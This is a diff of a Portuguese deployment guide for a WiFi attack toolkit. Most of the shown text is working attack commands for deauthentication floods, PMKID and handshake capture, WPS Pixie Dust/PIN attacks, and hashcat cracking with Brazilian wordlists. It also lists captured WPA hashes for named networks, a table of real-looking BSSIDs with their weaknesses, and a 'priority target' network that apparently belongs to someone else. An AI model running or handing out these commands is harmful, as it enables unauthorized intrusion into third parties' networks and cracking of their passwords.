@@ -1,4 +1,4 @@
-# WirelessXPL-Forge — Guia de Deploy em Kali Linux Nativo
+# WirelessXPL-Forge - Guia de Deploy em Kali Linux Nativo
 
 **Versão:** 1.2.0  
 **Data:** 2026-05-03  
@@ -72,11 +72,11 @@ sudo python3 wxf.py
 
 # Modo não-interativo
 sudo python3 wxf.py -m generic/wifi_lab/handshake_snooper \
-    -s "interface wlan0mon" \
-    -s "target_bssid AA:BB:CC:DD:EE:FF" \
-    -s "target_channel 6" \
-    -s "deauth_count 10" \
-    -s "capture_timeout 60"
+ -s "interface wlan0mon" \
+ -s "target_bssid AA:BB:CC:DD:EE:FF" \
+ -s "target_channel 6" \
+ -s "deauth_count 10" \
+ -s "capture_timeout 60"
 ```
 
 ---
@@ -91,32 +91,32 @@ OWN_CH=1
 
 # 1. Scan de APs
 sudo python3 wxf.py -m generic/wifi_lab/wifi_security_analyzer \
-    -s "interface $IFACE" -s "scan_time 60"
+ -s "interface $IFACE" -s "scan_time 60"
 
-# 2. PMKID capture (hcxdumptool bridge — já corrigido para v6.3)
+# 2. PMKID capture (hcxdumptool bridge - já corrigido para v6.3)
 sudo python3 wxf.py -m generic/external/hcxdumptool_live_bridge \
-    -s "interface $IFACE" -s "duration 120" \
-    -s "output_file /tmp/pmkid.pcapng" -s "i_know_scope true"
+ -s "interface $IFACE" -s "duration 120" \
+ -s "output_file /tmp/pmkid.pcapng" -s "i_know_scope true"
 
-# 3. Handshake + deauth (v2.0 — com scan de clientes + captura simultânea)
+# 3. Handshake + deauth (v2.0 - com scan de clientes + captura simultânea)
 sudo python3 wxf.py -m generic/wifi_lab/deauth_multimode \
-    -s "interface $IFACE" \
-    -s "target_bssid $OWN_BSSID" \
-    -s "channel $OWN_CH" \
-    -s "mode broadcast" \
-    -s "backend mdk4" \
-    -s "duration 60" \
-    -s "capture_handshake true"
+ -s "interface $IFACE" \
+ -s "target_bssid $OWN_BSSID" \
+ -s "channel $OWN_CH" \
+ -s "mode broadcast" \
+ -s "backend mdk4" \
+ -s "duration 60" \
+ -s "capture_handshake true"
 
-# 4. WPS AUTO (pixie_dust → null_pin → pin_wordlist — v2.0)
+# 4. WPS AUTO (pixie_dust → null_pin → pin_wordlist - v2.0)
 sudo python3 wxf.py -m generic/wifi_lab/wps_multimode \
-    -s "target_bssid $OWN_BSSID" \
-    -s "interface $IFACE" \
-    -s "target_channel $OWN_CH" \
-    -s "mode auto" \
-    -s "timeout 300" \
-    -s "pin_delay 2" \
-    -s "output_dir /tmp/wxf_wps"
+ -s "target_bssid $OWN_BSSID" \
+ -s "interface $IFACE" \
+ -s "target_channel $OWN_CH" \
+ -s "mode auto" \
+ -s "timeout 300" \
+ -s "pin_delay 2" \
+ -s "output_dir /tmp/wxf_wps"
 
 # 5. Crack GPU (após captura)
 hcxpcapngtool /tmp/pmkid.pcapng -o /tmp/hashes.txt
@@ -130,16 +130,16 @@ hashcat -m 22000 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
 Arquivo salvo em: `resources/captured_hashes.txt`
 
 ```
-# UNIAOGEEK — EAPOL handshake completo (WPA*02)
+# UNIAOGEEK - EAPOL handshake completo (WPA*02)
 WPA*02*1e949295a285576cb2fd23f98e71ec1e*724e6b1acb90*...
 
-# Denise 2 — PMKID
+# Denise 2 - PMKID
 WPA*01*d06e6e11988009fb7f15374d001a9ba0*78321b6546e4*...
 
-# Denise — PMKID  
+# Denise - PMKID  
 WPA*01*5a402b2e419317e119b540824af9964d*e820e2060f4b*...
 
-# NET_2G060F46-IoT — PMKID
+# NET_2G060F46-IoT - PMKID
 WPA*01*495ac3e4919f6d54ac9a77630154d5d2*ea20e206104e*...
 ```
 
@@ -149,7 +149,7 @@ hashcat -m 22000 resources/captured_hashes.txt \
     /usr/share/wordlists/rockyou.txt \
     /opt/WordListsForHacking/passwords/wlist_brasil.lst \
     /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt \
-    -r /usr/share/hashcat/rules/best64.rule
+ -r /usr/share/hashcat/rules/best64.rule
 
 # Brute force numérico BR (8-11 dígitos)
 for D in 8 9 10 11; do
@@ -158,11 +158,11 @@ done
 
 # WFH Markov (treinado em wlist_brasil)
 python3 /opt/WordListsForHacking/wfh.py markov train \
-    --wordlist /opt/WordListsForHacking/passwords/wlist_brasil.lst \
-    --model-output /tmp/markov.pkl
+ --wordlist /opt/WordListsForHacking/passwords/wlist_brasil.lst \
+ --model-output /tmp/markov.pkl
 python3 /opt/WordListsForHacking/wfh.py markov generate \
-    --model /tmp/markov.pkl --min-len 8 --max-len 20 \
-    --limit 2000000 -o /tmp/markov_cands.txt
+ --model /tmp/markov.pkl --min-len 8 --max-len 20 \
+ --limit 2000000 -o /tmp/markov_cands.txt
 hashcat -m 22000 resources/captured_hashes.txt /tmp/markov_cands.txt
 ```
 
@@ -180,7 +180,7 @@ hashcat -m 22000 resources/captured_hashes.txt /tmp/markov_cands.txt
 ### Vulnerabilidades Identificadas
 | Rede | BSSID | Vulnerabilidade | Prioridade |
 |---|---|---|---|
-| `1-708` | `44:3B:32:B2:CF:81` | **WPS 1.0 — Pixie Dust** | ALTA |
+| `1-708` | `44:3B:32:B2:CF:81` | **WPS 1.0 - Pixie Dust** | ALTA |
 | `Denise` | `E8:20:E2:06:0F:4B` | TKIP (CVE-2008-2370) | ALTA |
 | `TrOll_MaStEr_BLaStEr_2Ghz` | `F0:25:8E:EA:A1:38` | TKIP + -37dBm | ALTA |
 | `VOE_AP1704` | `CC:29:BD:20:18:AB` | TKIP + WPS 2.0 | MÉDIA |
@@ -188,14 +188,14 @@ hashcat -m 22000 resources/captured_hashes.txt /tmp/markov_cands.txt
 
 ### Alvo Prioritário no Kali Nativo
 ```bash
-# 1-708 WPS 1.0 — Pixie Dust com 5min (deve crackar)
+# 1-708 WPS 1.0 - Pixie Dust com 5min (deve crackar)
 sudo python3 wxf.py -m generic/wifi_lab/wps_multimode \
-    -s "target_bssid 44:3B:32:B2:CF:81" \
-    -s "interface wlan0mon" \
-    -s "target_channel 7" \
-    -s "mode auto" \
-    -s "timeout 300" \
-    -s "pin_delay 1"
+ -s "target_bssid 44:3B:32:B2:CF:81" \
+ -s "interface wlan0mon" \
+ -s "target_channel 7" \
+ -s "mode auto" \
+ -s "timeout 300" \
+ -s "pin_delay 1"
 ```
 
 ---
